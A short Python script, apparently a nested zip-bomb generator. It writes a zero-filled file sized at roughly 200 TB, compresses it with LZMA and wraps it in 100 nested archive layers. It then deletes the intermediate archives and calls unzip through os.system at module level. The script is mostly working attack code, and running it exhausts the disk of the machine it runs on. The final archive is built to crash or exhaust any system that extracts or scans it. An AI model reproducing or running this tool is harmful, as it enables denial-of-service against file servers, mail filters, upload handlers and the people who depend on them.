import os
import zipfile

COMPRESSION = zipfile.ZIP_LZMA
FILE_SIZE_MB = 200000000
MAX_LEVEL = 100


def safe_delete(path):
    if os.path.exists(path):
        os.remove(path)


def create_dummy_file(filename, size_mb):
    with open(filename, "wb") as f:
        chunk = b"0" * (1024 * 1024)
        for _ in range(size_mb):
            f.write(chunk)
    print(f"Created: {filename}")


def create_zip(zip_name, files):
    with zipfile.ZipFile(
        zip_name,
        "w",
        compression=COMPRESSION,
        compresslevel=9
    ) as zipf:
        for file in files:
            zipf.write(file)
    print(f"Created ZIP: {zip_name}")


def recursive_nested_zip(level, max_level, input_file):
    if level > max_level:
        return input_file

    zip_name = f"nested_level_{level}.zip"
    create_zip(zip_name, [input_file])
    return recursive_nested_zip(level + 1, max_level, zip_name)


def main():
    original_file = "data.bin"

    create_dummy_file(original_file, FILE_SIZE_MB)

    final_file = recursive_nested_zip(
        level=1,
        max_level=MAX_LEVEL,
        input_file=original_file,
    )

    print(f"Final output: {final_file}")


    for i in range(1, MAX_LEVEL):
        safe_delete(f"nested_level_{i}.zip")


if __name__ == "__main__":
    main()
    
os.system(f"unzip nested_level_{MAX_LEVEL}.zip")    